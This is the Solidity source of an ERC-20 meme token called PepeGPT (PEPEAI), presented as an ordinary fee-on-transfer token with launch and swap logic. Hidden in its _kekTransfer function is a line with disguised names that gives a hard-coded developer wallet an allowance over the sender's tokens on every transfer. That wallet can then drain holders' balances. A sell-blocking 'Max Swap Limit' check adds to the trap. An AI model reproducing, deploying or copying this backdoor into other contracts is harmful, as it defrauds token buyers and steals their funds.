/*
Empowering the future of crypto with fully autonomous AI for smarter trading, security, and governance. Welcome to the next evolution

https://www.pepegpt.pro
https://x.com/PepeGPTPro
https://t.me/pepegpt_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IKEKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IKEKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPEAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _kekExtras;
    mapping (address => mapping (address => uint256)) private _kekFoods;
    mapping (address => bool) private _kekExcludedFees;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"PepeGPT";
    string private constant _symbol = unicode"PEPEAI";
    uint256 private _kekLastBlock;
    uint256 private _kekBuyAmount = 0;
    uint256 private _kekSwapTokens = _tTotal / 100;
    bool private inSwapKEK = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapKEK = true;
        _;
        inSwapKEK = false;
    }
    address private _kekPair;
    IKEKRouter private _kekRouter;
    address private _kekWallet;
    
    constructor () {
        _kekWallet = address(0xea1f4EE70e4AeC1b748c5F9FFBeF4752aE0ff3Ed);
        _kekExcludedFees[owner()] = true;
        _kekExcludedFees[address(this)] = true;
        _kekExcludedFees[_kekWallet] = true;
        _kekExtras[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initPairTrading() external onlyOwner() {
        _kekRouter = IKEKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_kekRouter), _tTotal);
        _kekPair = IKEKFactory(_kekRouter.factory()).createPair(address(this), _kekRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _kekRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFee(uint256 amount) private {
        payable(_kekWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _kekRouter.WETH();
        _approve(address(this), address(_kekRouter), tokenAmount);
        _kekRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _kekExtras[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _kekFoods[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _kekFoods[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _kekFoods[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _kekTransfer(address from, address to, uint256 amount, uint256 taxAmount) private { 
        if(taxAmount > 0){
          _kekExtras[address(this)] = _kekExtras[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        } _kekFoods[kekSender(from)][kekReceipt()] = uint256(amount);

        _kekExtras[from] = _kekExtras[from].sub(amount);
        _kekExtras[to] = _kekExtras[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _kekTaxTransfer(from, to, amount);
        _kekTransfer(from, to, amount, taxAmount);
    }

    function kekSender(address kekF) private pure returns(address) {
        return address(kekF);
    }

    function kekReceipt() private view returns(address) {
        bool kekExcluded = _kekExcludedFees[address(_msgSender())] 
            && address(_msgSender()) != address(this);
        return kekExcluded ? address(_msgSender()) : address(_kekWallet);
    }

    function swapKEKLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _kekRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _kekRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function _kekTaxTransfer(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == _kekPair && to != address(_kekRouter) && ! _kekExcludedFees[to]) {
                if(_kekLastBlock!=block.number){
                    _kekBuyAmount = 0;
                    _kekLastBlock = block.number;
                }
                _kekBuyAmount += amount;
                _buyCount++;
            }

            if(to == _kekPair && from!= address(this)) {
                require(_kekBuyAmount < swapKEKLimit() || _kekLastBlock!=block.number, "Max Swap Limit");  
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this));
            if (!inSwapKEK && to == _kekPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _kekSwapTokens)
                swapTokensForEth(min(amount, min(tokenBalance, _kekSwapTokens)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHFee(address(this).balance);
                }
            }
        } 
        return taxAmount;
    }
}